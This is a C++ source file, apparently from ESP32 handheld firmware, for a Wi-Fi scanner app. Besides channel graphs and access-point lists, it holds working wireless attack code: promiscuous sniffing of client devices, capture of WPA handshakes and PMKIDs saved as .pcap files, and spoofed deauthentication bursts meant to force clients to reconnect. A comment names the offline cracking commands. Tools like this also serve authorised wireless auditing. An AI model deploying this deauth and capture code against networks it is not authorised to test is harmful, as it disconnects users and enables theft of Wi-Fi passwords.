#include <Tactility/RecursiveMutex.h>
#include <Tactility/Timer.h>
#include <Tactility/app/alertdialog/AlertDialog.h>
#include <Tactility/app/wificonnect/WifiConnect.h>
#include <Tactility/service/music/Music.h>
#include <Tactility/service/neopixel/NeoPixel.h>
#include <Tactility/service/wifi/Wifi.h>

#include <app/event.h>
#include <app/manager.h>
#include <app/manifest.h>
#include <app/scheduler.h>

#include <lvgl_window_manager/window_manager.h>

#include <tactility/check.h>
#include <tactility/log.h>

#include "OuiTable.h"

#include <algorithm>
#include <atomic>
#include <cmath>
#include <cstdio>
#include <cstring>
#include <map>
#include <memory>
#include <string>
#include <vector>

#include <lvgl/lvgl.h>
#include <lvgl/widgets/toolbar.h>

#ifdef ESP_PLATFORM
#include <esp_wifi.h>
#include <esp_timer.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <sys/stat.h>
#endif

namespace tt::app::wifiscanner {

extern const ::AppManifest manifest;

namespace {

constexpr auto* TAG = "WifiScanner";
constexpr uint16_t MAX_RECORDS = 40;
constexpr uint32_t REFRESH_MS = 1000;
constexpr uint32_t ROW_EXPIRY_MS = 20000;

// The chart's x-axis runs from channel CH_AXIS_MIN to CH_AXIS_MAX across CHART_POINTS samples.
// Channels 1..13 sit inside with a small margin for the outer bells. An AP's bell is +-2 channels
// wide (a 20 MHz signal). A tighter range than the old -1..15 so the channel scale uses more of
// the (wider) chart area.
constexpr int MAX_SERIES = 8;
constexpr int CHART_POINTS = 33;
constexpr float BELL_HALF_WIDTH = 2.0f;
constexpr float CH_AXIS_MIN = 0.0f;
constexpr float CH_AXIS_MAX = 14.0f;
constexpr int32_t SIGNAL_FLOOR_DBM = -100;
constexpr int32_t SIGNAL_RANGE_DB = 70;
constexpr uint32_t HOP_INTERVAL_MS = 300;
constexpr int MAX_PROBED_SSIDS = 4;

/** Fraction 0..1 of the chart width where a channel's vertical line / bell peak sits. */
inline float channelFraction(int channel) {
    return ((float)channel - CH_AXIS_MIN) / (CH_AXIS_MAX - CH_AXIS_MIN);
}

// Pure, saturated hues (each uses at most two channels). The old muted palette had a blue
// component in every colour that was faint on the LCD but strong on the WS2812 LEDs, so "red"
// lit up purple and "green" cyan. These render the same on screen and on the strip.
const uint32_t SERIES_COLORS[MAX_SERIES] = {
    0xFF0000, // red
    0xFF7F00, // orange
    0xFFFF00, // yellow
    0x00FF00, // green
    0x00FFFF, // cyan
    0x0000FF, // blue
    0x8000FF, // violet
    0xFF00FF, // magenta
};

enum class Page { Graph, List, Detail, Clients };
enum class RadioMode { Stopped, ActiveScan, Capture };

uint64_t bssidKey(const uint8_t* bssid) {
    uint64_t key = 0;
    for (int i = 0; i < 6; i++) key = (key << 8) | bssid[i];
    return key;
}

uint64_t nowMs() { return (uint64_t)lv_tick_get(); }

/** One access point, merging whatever the active scan and the passive capture both know about it. */
struct SeenAp {
    WifiApRecord record{};
    uint64_t firstSeenMs = 0;
    uint64_t lastSeenMs = 0;
    int8_t rssiMin = 0;
    int8_t rssiMax = 0;
    bool fromCapture = false;
    uint32_t packetCount = 0;
    // Stable colour for this network, assigned once at first sight and used for both its bell on
    // the graph and its colour bar in the list, so the two always match.
    int colorIndex = 0;
};

// Handshake / PMKID capture: we buffer the raw 802.11 frames in RAM (never touch the SD from the
// promiscuous callback) and a periodic flush writes a .pcap per network to /sdcard/handshakes.
constexpr int HS_MAX_APS = 16;
constexpr int HS_FRAME_MAX = 320;  // one 802.11 frame (EAPOL or beacon) we keep
constexpr int HS_BEACON_MAX = 400;

struct HandshakeCapture {
    char ssid[33] = {};
    uint8_t beacon[HS_BEACON_MAX] = {};
    int beaconLen = 0;
    uint8_t eapol[4][HS_FRAME_MAX] = {}; // M1..M4, whole 802.11 frames
    int eapolLen[4] = {0, 0, 0, 0};
    uint8_t msgMask = 0;   // bit i set once Mi+1 is captured
    bool hasPmkid = false;
    bool saved = false;
    // Separate from `saved`: `saved` is deliberately re-armed by every new message (so a later,
    // more complete capture overwrites the .pcap), but the beep must fire exactly once per
    // handshake - otherwise M3/M4 landing moments after M1+M2 each re-arm `saved` and spawn a
    // second, overlapping eapolSoundTask that races the first for the Music service's gain/queue
    // state, which is why it can go silent instead of beeping twice.
    bool beepFired = false;
};

/** A device seen only through passive capture: probing for a network, or associated to one. */
struct CapturedClient {
    uint8_t mac[6] = {};
    uint64_t firstSeenMs = 0;
    uint64_t lastSeenMs = 0;
    int8_t lastRssi = 0;
    uint64_t associatedBssid = 0;
    std::vector<std::string> probedSsids;
    uint32_t packetCount = 0;
    uint32_t txCount = 0; // data frames the client sent (to the AP)
    uint32_t rxCount = 0; // data frames the client received (from the AP)
};

struct Context {
    uint32_t appInstanceId = 0;
    WindowId window = 0;

    RecursiveMutex mutex;
    std::unique_ptr<Timer> timer = nullptr;
    std::unique_ptr<Timer> ledTimer = nullptr; // fast feed for the detail VU bar
    std::atomic<bool> vuFeeding{false};
    std::atomic<int> vuLevel{0};
    std::atomic<uint32_t> vuRefreshTick{0}; // tick of the last fresh reading, for the breath swell

    Page page = Page::Graph;
    std::map<uint64_t, SeenAp> seen;
    std::map<uint64_t, CapturedClient> clients;
    std::map<uint64_t, HandshakeCapture> handshakes;
    int handshakesSaved = 0; // .pcap files written this session
    int pmkidSeen = 0;
    int deauthBurstsSent = 0; // confirmed deauth bursts sent this session
    // Set from the LVGL task when the confirm dialog opens, read from this app's own task when
    // the dialog's APP_EVENT_RESULT comes back - both directions cross threads.
    std::atomic<uint32_t> deauthDialogId{0};
    std::vector<uint64_t> visible; // sorted by RSSI, rebuilt each refresh
    uint64_t selectedKey = 0;
    uint32_t detailBeaconBaseline = 0;
    // Cached at selection time so the lock toggle still works once the AP ages out of ctx->seen
    // (20s unheard - see ROW_EXPIRY_MS) - a live lookup there left the lock stuck forever.
    int detailChannel = 0;
    int nextColor = 0; // running counter for assigning SeenAp::colorIndex
    RadioMode mode = RadioMode::ActiveScan;

    // LED strip: the config to put back on exit/stop, and a cache of what we last pushed so we
    // don't restart the animation every refresh.
    bool ledSaved = false;
    service::neopixel::Animation savedAnim = service::neopixel::Animation::Off;
    service::neopixel::ColorMode savedColorMode = service::neopixel::ColorMode::Static;
    uint8_t savedR = 0, savedG = 0, savedB = 0, savedBrightness = 0, savedSpeed = 0;
    // Saved VU-meter config: the detail page borrows the meter to draw a proximity bar, so we put
    // the user's meter settings back on exit.
    bool savedVuActive = false, savedVuDecay = false, savedVuAutoGain = false, savedVuBeatFlash = false, savedVuPeakHold = false;
    service::neopixel::VuPalette savedVuPalette = service::neopixel::VuPalette::Classic;
    service::neopixel::VuOrigin savedVuOrigin = service::neopixel::VuOrigin::BothLeft;
    uint8_t savedVuR = 0, savedVuG = 0, savedVuB = 0, savedVuBrightness = 0, savedVuSensitivity = 0;
    int ledViewApplied = -1;   // 0 scan, 1 capture, 2 stopped, 3 detail
    int ledColorApplied = -1;

    lv_obj_t* toolbar = nullptr;
    lv_obj_t* statusLabel = nullptr;

    lv_obj_t* graphPage = nullptr;
    lv_obj_t* chart = nullptr;
    lv_obj_t* labelLayer = nullptr;
    lv_chart_series_t* series[MAX_SERIES] = {};
    lv_obj_t* scanButton = nullptr;
    lv_obj_t* captureButton = nullptr;
    lv_obj_t* stopButton = nullptr;

    lv_obj_t* listPage = nullptr;
    lv_obj_t* list = nullptr;
    std::map<uint64_t, lv_obj_t*> rows;

    lv_obj_t* detailPage = nullptr;
    lv_obj_t* detailScroll = nullptr;
    lv_obj_t* detailInfo = nullptr;
    lv_obj_t* detailClientsButton = nullptr;
    lv_obj_t* detailLockButton = nullptr;
    lv_obj_t* detailDeauthButton = nullptr;
    lv_obj_t* detailHsSummary = nullptr; // compact "HS: x/4  PMKID: si/no" right under Deauth
    lv_obj_t* connectButton = nullptr;

    lv_obj_t* clientsPage = nullptr;
    lv_obj_t* clientsList = nullptr;
    std::map<uint64_t, lv_obj_t*> clientRows;
};

// ---- Capture engine (ESP32 only - passive sniffing needs direct esp_wifi access) ----

#ifdef ESP_PLATFORM

std::atomic<Context*> g_captureCtx{nullptr};
std::atomic<bool> g_captureRunning{false};
std::atomic<bool> g_captureStopped{true};
std::atomic<int> g_hopChannel{1};
// 0 = hop normally; 1..13 = park on that channel (targeted capture, so a handshake on that
// AP isn't missed while the radio is off visiting other channels).
std::atomic<int> g_lockChannel{0};

/** Pulls the SSID (tag 0) and a WPA/WPA2/OPEN/WEP guess out of a beacon/probe-response's IEs.
 * No AKM parsing, so WPA3/SAE reads as WPA2 here - good enough to color the list, not a survey tool. */
void parseBeaconIes(const uint8_t* ies, int iesLen, uint16_t capability,
    std::string& ssidOut, bool& ssidSeen, WifiAuthenticationType& authOut) {
    bool privacy = (capability & 0x0010) != 0;
    bool hasRsn = false;
    bool hasWpa = false;
    ssidSeen = false;
    int i = 0;
    while (i + 2 <= iesLen) {
        uint8_t tag = ies[i];
        uint8_t len = ies[i + 1];
        if (i + 2 + len > iesLen) break;
        const uint8_t* data = ies + i + 2;
        if (tag == 0) {
            ssidOut.assign(reinterpret_cast<const char*>(data), len);
            ssidSeen = len > 0;
        } else if (tag == 48) {
            hasRsn = true;
        } else if (tag == 221 && len >= 4 && data[0] == 0x00 && data[1] == 0x50 && data[2] == 0xF2 && data[3] == 0x01) {
            hasWpa = true;
        }
        i += 2 + len;
    }
    if (!privacy) authOut = WIFI_AUTHENTICATION_TYPE_OPEN;
    else if (hasRsn && hasWpa) authOut = WIFI_AUTHENTICATION_TYPE_WPA_WPA2_PSK;
    else if (hasRsn) authOut = WIFI_AUTHENTICATION_TYPE_WPA2_PSK;
    else if (hasWpa) authOut = WIFI_AUTHENTICATION_TYPE_WPA_PSK;
    else authOut = WIFI_AUTHENTICATION_TYPE_WEP;
}

/** @return the SSID carried in a probe request's IEs, or empty if none/broadcast. */
std::string parseProbeRequestSsid(const uint8_t* ies, int iesLen) {
    int i = 0;
    while (i + 2 <= iesLen) {
        uint8_t tag = ies[i];
        uint8_t len = ies[i + 1];
        if (i + 2 + len > iesLen) break;
        if (tag == 0 && len > 0) {
            return std::string(reinterpret_cast<const char*>(ies + i + 2), len);
        }
        i += 2 + len;
    }
    return {};
}

void upsertApFromCapture(Context* ctx, const uint8_t* bssid, const std::string& ssid, bool ssidSeen,
    int channel, int8_t rssi, WifiAuthenticationType auth) {
    if (!ctx->mutex.lock(0)) return;
    uint64_t key = bssidKey(bssid);
    uint64_t now = nowMs();
    auto it = ctx->seen.find(key);
    if (it == ctx->seen.end()) {
        SeenAp ap{};
        memcpy(ap.record.bssid, bssid, 6);
        if (ssidSeen) {
            size_t len = std::min<size_t>(ssid.size(), sizeof(ap.record.ssid) - 1);
            memcpy(ap.record.ssid, ssid.data(), len);
            ap.record.ssid[len] = '\0';
        }
        ap.record.channel = channel;
        ap.record.rssi = rssi;
        ap.record.authentication_type = auth;
        ap.record.pairwise_cipher = WIFI_AP_CIPHER_UNKNOWN;
        ap.firstSeenMs = now;
        ap.lastSeenMs = now;
        ap.rssiMin = ap.rssiMax = rssi;
        ap.fromCapture = true;
        ap.colorIndex = ctx->nextColor++ % MAX_SERIES;
        ap.packetCount = 1;
        ctx->seen.emplace(key, ap);
    } else {
        SeenAp& ap = it->second;
        if (ssidSeen && ap.record.ssid[0] == '\0') {
            size_t len = std::min<size_t>(ssid.size(), sizeof(ap.record.ssid) - 1);
            memcpy(ap.record.ssid, ssid.data(), len);
            ap.record.ssid[len] = '\0';
        }
        ap.record.channel = channel;
        ap.record.rssi = rssi;
        ap.lastSeenMs = now;
        ap.packetCount++;
        ap.rssiMin = std::min(ap.rssiMin, rssi);
        ap.rssiMax = std::max(ap.rssiMax, rssi);
        if (ap.fromCapture) ap.record.authentication_type = auth;
    }
    ctx->mutex.unlock();
}

void upsertClientProbe(Context* ctx, const uint8_t* mac, const std::string& probedSsid, int8_t rssi) {
    if (!ctx->mutex.lock(0)) return;
    uint64_t key = bssidKey(mac);
    uint64_t now = nowMs();
    auto& client = ctx->clients[key];
    if (client.packetCount == 0) {
        memcpy(client.mac, mac, 6);
        client.firstSeenMs = now;
    }
    client.lastSeenMs = now;
    client.lastRssi = rssi;
    client.packetCount++;
    if (!probedSsid.empty() &&
        std::find(client.probedSsids.begin(), client.probedSsids.end(), probedSsid) == client.probedSsids.end() &&
        client.probedSsids.size() < MAX_PROBED_SSIDS) {
        client.probedSsids.push_back(probedSsid);
    }
    ctx->mutex.unlock();
}

void upsertClientAssociation(Context* ctx, const uint8_t* mac, const uint8_t* bssid, int8_t rssi, bool clientSent) {
    if (!ctx->mutex.lock(0)) return;
    uint64_t key = bssidKey(mac);
    uint64_t now = nowMs();
    auto& client = ctx->clients[key];
    if (client.packetCount == 0) {
        memcpy(client.mac, mac, 6);
        client.firstSeenMs = now;
    }
    client.lastSeenMs = now;
    client.lastRssi = rssi;
    client.associatedBssid = bssidKey(bssid);
    client.packetCount++;
    if (clientSent) client.txCount++; else client.rxCount++;
    ctx->mutex.unlock();
}

/** Stores a raw beacon for an AP we're already collecting a handshake for (gives the .pcap its
 * SSID). Only kept for tracked BSSIDs, to bound RAM. */
void storeBeaconForHandshake(Context* ctx, const uint8_t* bssid, const uint8_t* frame, int len, const std::string& ssid) {
    if (!ctx->mutex.lock(0)) return;
    auto it = ctx->handshakes.find(bssidKey(bssid));
    if (it != ctx->handshakes.end() && it->second.beaconLen == 0) {
        int n = std::min(len, HS_BEACON_MAX);
        memcpy(it->second.beacon, frame, n);
        it->second.beaconLen = n;
        if (!ssid.empty() && it->second.ssid[0] == '\0') {
            size_t s = std::min(ssid.size(), sizeof(it->second.ssid) - 1);
            memcpy(it->second.ssid, ssid.data(), s);
            it->second.ssid[s] = '\0';
        }
    }
    ctx->mutex.unlock();
}

/** Detects an EAPOL-Key frame (the WPA 4-way handshake) and buffers the whole 802.11 frame in the
 * right message slot (M1..M4) for its AP. Also flags a PMKID when the AP exposes one in M1. */
void handleEapol(Context* ctx, const uint8_t* payload, int len, uint8_t subtype, const uint8_t* addr1, const uint8_t* addr2) {
    int hdr = 24;
    if (subtype & 0x08) hdr += 2; // QoS data carries a 2-byte QoS control field
    if (len < hdr + 8 + 7) return;
    const uint8_t* llc = payload + hdr;
    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03)) return; // not LLC/SNAP
    if (((llc[6] << 8) | llc[7]) != 0x888E) return;                    // not EAPOL
    const uint8_t* eapol = llc + 8;
    int eapolLen = len - hdr - 8;
    if (eapolLen < 7 || eapol[1] != 0x03) return;                      // EAPOL-Key only
    uint16_t keyInfo = (eapol[5] << 8) | eapol[6];
    bool mic = keyInfo & 0x0100, ack = keyInfo & 0x0080, install = keyInfo & 0x0040, secure = keyInfo & 0x0200;
    int slot;
    if (ack && !mic) slot = 0;                  // M1 (AP -> STA)
    else if (mic && !ack && !secure) slot = 1;  // M2 (STA -> AP)
    else if (ack && mic && install) slot = 2;   // M3 (AP -> STA)
    else if (mic && !ack && secure) slot = 3;   // M4 (STA -> AP)
    else return;
    const uint8_t* bssid = (slot == 0 || slot == 2) ? addr2 : addr1;   // the AP side

    bool pmkid = false;
    if (slot == 0) {
        for (int i = 0; i + 6 <= eapolLen; i++) {
            if (eapol[i] == 0xDD && eapol[i + 2] == 0x00 && eapol[i + 3] == 0x0F &&
                eapol[i + 4] == 0xAC && eapol[i + 5] == 0x04) { pmkid = true; break; }
        }
        // Diagnostic: tells apart "M1 never captured" (so this scan never even ran) from "M1
        // captured but this AP just doesn't send a PMKID KDE" (which is a legitimate, common
        // case - PMKID in M1 is optional and vendor-dependent, not every router sends one).
        LOG_I(TAG, "handshake: M1 for AP %02x:%02x:%02x:%02x:%02x:%02x, pmkid=%s",
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], pmkid ? "yes" : "no");
    }

    if (!ctx->mutex.lock(0)) return;
    uint64_t key = bssidKey(bssid);
    auto it = ctx->handshakes.find(key);
    if (it == ctx->handshakes.end()) {
        if ((int)ctx->handshakes.size() >= HS_MAX_APS) { ctx->mutex.unlock(); return; }
        it = ctx->handshakes.emplace(key, HandshakeCapture{}).first;
        auto sit = ctx->seen.find(key);
        if (sit != ctx->seen.end()) {
            strncpy(it->second.ssid, sit->second.record.ssid, sizeof(it->second.ssid) - 1);
        }
    }
    HandshakeCapture& hc = it->second;
    if (hc.eapolLen[slot] == 0) {
        int n = std::min(len, HS_FRAME_MAX);
        memcpy(hc.eapol[slot], payload, n);
        hc.eapolLen[slot] = n;
        hc.msgMask |= (uint8_t)(1 << slot);
        hc.saved = false; // a new message arrived - allow a re-save with more of the handshake
        // Diagnostic: shows the real capture order (M1 is the one most likely lost to the
        // channel-hop race, since it fires within ms of association - well under one hop dwell).
        LOG_I(TAG, "handshake: M%d captured, mask now 0x%02x", slot + 1, hc.msgMask);
    }
    if (pmkid && !hc.hasPmkid) { hc.hasPmkid = true; ctx->pmkidSeen++; }
    ctx->mutex.unlock();
}

/** Runs on the ESP-IDF WiFi task context (guaranteed by esp_wifi_set_promiscuous_rx_cb). */
void onPromiscuousPacket(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    Context* ctx = g_captureCtx.load();
    if (ctx == nullptr) return;

    auto* pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;

    uint16_t fc = payload[0] | (payload[1] << 8);
    uint8_t frameType = (fc >> 2) & 0x3;
    uint8_t frameSubtype = (fc >> 4) & 0xF;
    bool toDs = (fc & 0x0100) != 0;
    bool fromDs = (fc & 0x0200) != 0;
    const uint8_t* addr1 = payload + 4;
    const uint8_t* addr2 = payload + 10;
    const uint8_t* addr3 = payload + 16;
    int8_t rssi = pkt->rx_ctrl.rssi;
    int channel = pkt->rx_ctrl.channel;

    if (frameType == 0) { // management
        if ((frameSubtype == 8 || frameSubtype == 5) && len >= 24 + 12) { // beacon / probe response
            uint16_t capability = payload[24 + 10] | (payload[24 + 11] << 8);
            std::string ssid;
            bool ssidSeen = false;
            WifiAuthenticationType auth = WIFI_AUTHENTICATION_TYPE_OPEN;
            parseBeaconIes(payload + 24 + 12, len - 24 - 12, capability, ssid, ssidSeen, auth);
            upsertApFromCapture(ctx, addr3, ssid, ssidSeen, channel, rssi, auth);
            storeBeaconForHandshake(ctx, addr3, payload, len, ssid);
        } else if (frameSubtype == 4) { // probe request
            std::string ssid = parseProbeRequestSsid(payload + 24, len - 24);
            upsertClientProbe(ctx, addr2, ssid, rssi);
        }
    } else if (frameType == 2) { // data
        if (toDs && !fromDs) {
            // client -> AP: the client is the sender (addr2), AP is addr1
            upsertClientAssociation(ctx, addr2, addr1, rssi, true);
        } else if (!toDs && fromDs) {
            // AP -> client: the client is the receiver (addr1), AP is addr2
            upsertClientAssociation(ctx, addr1, addr2, rssi, false);
        }
        handleEapol(ctx, payload, len, frameSubtype, addr1, addr2); // 4-way handshake / PMKID
    }
}

// Kismet-style hop order: spread (consecutive hops land far apart in the band, not 1,2,3...) and
// weighted so the three non-overlapping channels 1/6/11 - where most APs live - are visited twice
// per cycle. This catches more without needing a faster (flickerier) hop than ~300 ms/channel.
constexpr int HOP_SEQUENCE[] = {1, 6, 11, 3, 8, 13, 2, 7, 1, 6, 11, 4, 9, 5, 10, 12};
constexpr int HOP_SEQUENCE_LEN = sizeof(HOP_SEQUENCE) / sizeof(HOP_SEQUENCE[0]);

int32_t hopTask(void* /*arg*/) {
    esp_wifi_set_promiscuous_rx_cb(&onPromiscuousPacket);
    wifi_promiscuous_filter_t filter{};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);

    int i = 0;
    while (g_captureRunning.load()) {
        int lock = g_lockChannel.load();
        int channel;
        if (lock >= 1 && lock <= 13) {
            channel = lock; // parked: stay put so M1..M4 of the handshake all land on us
        } else {
            channel = HOP_SEQUENCE[i];
            i = (i + 1) % HOP_SEQUENCE_LEN;
        }
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        g_hopChannel.store(channel);
        vTaskDelay(pdMS_TO_TICKS(HOP_INTERVAL_MS));
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    g_captureStopped.store(true);
    vTaskDelete(nullptr);
    return 0;
}

void startCapture(Context* ctx) {
    if (g_captureRunning.load()) return;
    g_captureCtx.store(ctx);
    g_captureStopped.store(false);
    // 0 is not a valid Wi-Fi channel - keeps sendDeauthBurstOnChannel()'s wait from matching a
    // stale value left over from a previous capture before hopTask has set a real one.
    g_hopChannel.store(0);
    g_captureRunning.store(true);
    xTaskCreatePinnedToCore(
        [](void* arg) { hopTask(arg); },
        "wifi_hop", 3072, nullptr, tskIDLE_PRIORITY + 1, nullptr, WIFI_TASK_CORE_ID);
}

void stopCapture(Context* ctx) {
    if (!g_captureRunning.load()) return;
    g_lockChannel.store(0); // next capture starts hopping again, not parked
    g_captureRunning.store(false);
    for (int i = 0; i < 100 && !g_captureStopped.load(); i++) {
        vTaskDelay(pdMS_TO_TICKS(20));
    }
    g_captureCtx.store(nullptr);
    (void)ctx;
}

bool isCaptureSupported() { return true; }

void setCaptureLockChannel(int ch) { g_lockChannel.store(ch); }
int getCaptureLockChannel() { return g_lockChannel.load(); }
// The channel the radio is actually sitting on right now - hopTask only re-reads the lock once
// per HOP_INTERVAL_MS, so right after setCaptureLockChannel() this can still briefly be the old
// (wrong) channel. Anything that transmits immediately (deauth) must wait for this to catch up.
int getCurrentRadioChannel() { return g_hopChannel.load(); }

// ---- Deauth (attack #2) ----

constexpr uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
constexpr int DEAUTH_BURST_COUNT = 12;
constexpr int DEAUTH_FRAME_GAP_MS = 25;

/** Builds and sends one 802.11 deauthentication frame: addr1 = destination, addr2 = source
 * (the spoofed sender), addr3 = BSSID. Reason 7 ("class 3 frame from a non-associated
 * station") is what aireplay-ng uses. en_sys_seq=true lets the radio fill the sequence
 * number, so the seq-ctl field here is left at 0. */
void sendDeauthFrame(const uint8_t* addr1, const uint8_t* addr2, const uint8_t* bssid) {
    uint8_t frame[26] = {
        0xC0, 0x00,  // Frame Control: management, subtype 12 (deauthentication)
        0x00, 0x00,  // Duration
        0, 0, 0, 0, 0, 0,  // addr1
        0, 0, 0, 0, 0, 0,  // addr2
        0, 0, 0, 0, 0, 0,  // addr3 (BSSID)
        0x00, 0x00,  // Seq-ctl
        0x07, 0x00,  // Reason code 7
    };
    memcpy(frame + 4, addr1, 6);
    memcpy(frame + 10, addr2, 6);
    memcpy(frame + 16, bssid, 6);
    // Nothing downstream ever looked at this - a driver-level failure (e.g. not yet past
    // esp_wifi_start(), or a scan in progress) was silently swallowed, so there was no way to
    // tell "frames go out but the client ignores them" apart from "frames never go out at all".
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
    if (err != ESP_OK) {
        LOG_W(TAG, "deauth: esp_wifi_80211_tx failed: %s", esp_err_to_name(err));
    }
}

/** A short, bounded deauth burst for one AP - not a continuous flood. Forces one reconnect
 * (useful to catch a fresh handshake), it does not keep clients off the network. Broadcasts
 * to every client when @a client is null; otherwise also spoofs the reverse (client -> AP)
 * direction, since a real client ignores a deauth that isn't addressed to it. */
void sendDeauthBurst(const uint8_t* bssid, const uint8_t* client) {
    const uint8_t* target = (client != nullptr) ? client : BROADCAST_MAC;
    LOG_I(TAG, "deauth: sending %d frames to %02x:%02x:%02x:%02x:%02x:%02x for AP %02x:%02x:%02x:%02x:%02x:%02x",
        DEAUTH_BURST_COUNT, target[0], target[1], target[2], target[3], target[4], target[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
        sendDeauthFrame(target, bssid, bssid);
        if (client != nullptr) {
            sendDeauthFrame(bssid, client, bssid);
        }
        vTaskDelay(pdMS_TO_TICKS(DEAUTH_FRAME_GAP_MS));
    }
}

/** setCaptureLockChannel() only posts the request - hopTask re-reads it once per
 * HOP_INTERVAL_MS, so right after locking the radio can still briefly be sitting on the
 * previous (wrong) channel. The whole burst (a couple hundred ms) is short enough to otherwise
 * race past that window and go out on the wrong channel entirely, which is exactly what makes
 * it silently do nothing. Wait for the radio to actually get there first (bounded, so a lock
 * that somehow never lands - e.g. hopTask not running - can't hang this forever). */
void sendDeauthBurstOnChannel(const uint8_t* bssid, int channel) {
    int i = 0;
    for (; i < 40 && getCurrentRadioChannel() != channel; i++) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    if (i >= 40) {
        // Sends anyway - better than silently doing nothing - but on the wrong channel this
        // burst goes out into empty air, which looks identical to "deauth did nothing" from
        // the outside. This is the one case worth knowing about from the serial log.
        LOG_W(TAG, "deauth: radio never reached channel %d (stuck at %d) - sending anyway",
            channel, getCurrentRadioChannel());
    }
    sendDeauthBurst(bssid, nullptr);
}

// ---- EAPOL capture sound ----

// Ships as a firmware asset under the internal /data partition (Data/data/wifiscanner/), not
// /sdcard/Music, so it plays regardless of SD card contents and never shows up in the Music
// app's library (that only browses .../Music).
constexpr auto* EAPOL_BEEP_PATH = "/data/wifiscanner/eapol_beep.mp3";
constexpr int EAPOL_BEEP_MAX_WAIT_MS = 1000; // bounded: a stuck decoder can't hang this task forever
constexpr int FADE_STEP_MS = 25;
constexpr int FADE_STEP_DB = 4;
constexpr int DUCK_FLOOR_DB = -20; // service::music::setGainDb()'s documented minimum - no mute API

/** Runs on its own task (never the RX callback or the app timer) so its fades and waits can't
 * delay packet capture. If music is playing: fade it out, pause it, play the beep at normal
 * volume (so it's actually audible), then resume the track from where it paused while fading
 * back in. If nothing is playing, just play the beep. */
void eapolSoundTask(void* /*arg*/) {
    using namespace tt::service::music;
    if (isAvailable()) {
        Telemetry telemetry = getTelemetry();
        int trackIndex = getTrackIndex();
        bool wasPlaying = telemetry.state == State::Playing && trackIndex >= 0;
        uint32_t savedPosition = telemetry.positionSeconds;
        int originalGain = getGainDb();

        if (wasPlaying) {
            for (int g = originalGain; g > DUCK_FLOOR_DB; g -= FADE_STEP_DB) {
                setGainDb(g);
                vTaskDelay(pdMS_TO_TICKS(FADE_STEP_MS));
            }
            setGainDb(DUCK_FLOOR_DB);
            playPause(); // freezes the track at savedPosition
            setGainDb(originalGain); // restore before the beep, so it isn't ducked too
        }

        enqueueAndPlay(EAPOL_BEEP_PATH);
        for (int waited = 0; waited < EAPOL_BEEP_MAX_WAIT_MS && !getTelemetry().finished; waited += 20) {
            vTaskDelay(pdMS_TO_TICKS(20));
        }
        removeFromQueueByPath(EAPOL_BEEP_PATH); // one-shot notification, not a library track

        if (wasPlaying) {
            setGainDb(DUCK_FLOOR_DB); // drop back down first, so the resume itself fades in
            playQueueIndex(trackIndex);
            seek(savedPosition);
            for (int g = DUCK_FLOOR_DB; g < originalGain; g += FADE_STEP_DB) {
                setGainDb(g);
                vTaskDelay(pdMS_TO_TICKS(FADE_STEP_MS));
            }
            setGainDb(originalGain);
        }
    }
    vTaskDelete(nullptr);
}

/** Fire-and-forget: called from flushHandshakes() when a handshake just became crackable. */
void triggerEapolSound() {
    xTaskCreate([](void* arg) { eapolSoundTask(arg); }, "wifiscanner_beep", 4096, nullptr,
        tskIDLE_PRIORITY + 1, nullptr);
}

// ---- .pcap writing (handshake export to SD) ----

void pcapU32(FILE* f, uint32_t v) { fwrite(&v, 4, 1, f); } // ESP32 is little-endian = pcap LE
void pcapU16(FILE* f, uint16_t v) { fwrite(&v, 2, 1, f); }

void pcapRecord(FILE* f, const uint8_t* data, int len) {
    uint64_t us = (uint64_t)esp_timer_get_time();
    pcapU32(f, (uint32_t)(us / 1000000));
    pcapU32(f, (uint32_t)(us % 1000000));
    pcapU32(f, (uint32_t)len);
    pcapU32(f, (uint32_t)len);
    fwrite(data, 1, len, f);
}

/** Writes beacon + captured EAPOL frames as a LINKTYPE_IEEE802_11 .pcap under /sdcard/handshakes.
 * Crack on a PC: hcxpcapngtool file.pcap -o hash.22000  (then hashcat -m 22000), or aircrack-ng. */
bool savePcap(const HandshakeCapture& hc, uint64_t bssidKeyVal) {
    mkdir("/sdcard/wifi-scanner", 0777); // mkdir doesn't create parents, so make each level
    mkdir("/sdcard/wifi-scanner/handshakes", 0777);
    char safe[33];
    int j = 0;
    for (int i = 0; hc.ssid[i] != '\0' && j < 32; i++) {
        char c = hc.ssid[i];
        safe[j++] = (c > 32 && c < 127 && c != '/' && c != '\\') ? c : '_';
    }
    safe[j] = '\0';
    char path[112];
    snprintf(path, sizeof(path), "/sdcard/wifi-scanner/handshakes/%s_%012llX.pcap",
        safe[0] != '\0' ? safe : "hidden", (unsigned long long)bssidKeyVal);

    FILE* f = fopen(path, "wb");
    if (f == nullptr) return false;
    pcapU32(f, 0xA1B2C3D4); // magic
    pcapU16(f, 2); pcapU16(f, 4); // version 2.4
    pcapU32(f, 0); pcapU32(f, 0); // thiszone, sigfigs
    pcapU32(f, 65535);            // snaplen
    pcapU32(f, 105);              // LINKTYPE_IEEE802_11
    if (hc.beaconLen > 0) pcapRecord(f, hc.beacon, hc.beaconLen);
    for (int s = 0; s < 4; s++) {
        if (hc.eapolLen[s] > 0) pcapRecord(f, hc.eapol[s], hc.eapolLen[s]);
    }
    fclose(f);
    return true;
}

#else

void startCapture(Context*) {}
void stopCapture(Context*) {}
bool isCaptureSupported() { return false; }
void setCaptureLockChannel(int) {}
int getCaptureLockChannel() { return 0; }
int getCurrentRadioChannel() { return 0; }
